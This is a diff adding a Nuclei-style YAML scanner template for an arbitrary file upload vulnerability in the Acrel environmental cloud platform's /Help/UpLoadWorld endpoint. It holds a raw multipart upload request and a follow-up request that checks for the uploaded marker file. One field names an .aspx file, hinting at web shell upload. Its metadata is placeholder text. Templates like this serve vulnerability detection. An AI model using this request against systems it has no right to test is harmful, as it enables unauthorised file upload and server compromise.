@@ -1,0 +1,58 @@
+id: AcrelCloud-3000-UpLoadWorld-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 安科瑞-智能环保云平台 uploadworld 存在任意文件上传漏洞
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}" 
+http:
+  - raw:
+      - |-
+        POST /Help/UpLoadWorld HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
+        Connection: close
+        Content-Length: 626
+        Content-Type: multipart/form-data; boundary=----fhc8nifu2wn7cspvush5
+        Accept-Encoding: gzip, deflate, br
+
+        ------fhc8nifu2wn7cspvush5
+        Content-Disposition: form-data; name="id"
+
+        WU_FILE_0
+        ------fhc8nifu2wn7cspvush5
+        Content-Disposition: form-data; name="name"
+
+        9b1ukpmjr1.aspx
+        ------fhc8nifu2wn7cspvush5
+        Content-Disposition: form-data; name="type"
+
+        application/pdf
+        ------fhc8nifu2wn7cspvush5
+        Content-Disposition: form-data; name="lastModifiedDate"
+
+        Sun Jan 05 2025 19:55:42
+        ------fhc8nifu2wn7cspvush5
+        Content-Disposition: form-data; name="size"
+
+        637
+        ------fhc8nifu2wn7cspvush5
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.txt"
+        Content-Type: application/pdf
+
+        whoisceshi
+        ------fhc8nifu2wn7cspvush5--
+      - |+
+        GET /UpLoad/Temp/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'
+#aspx
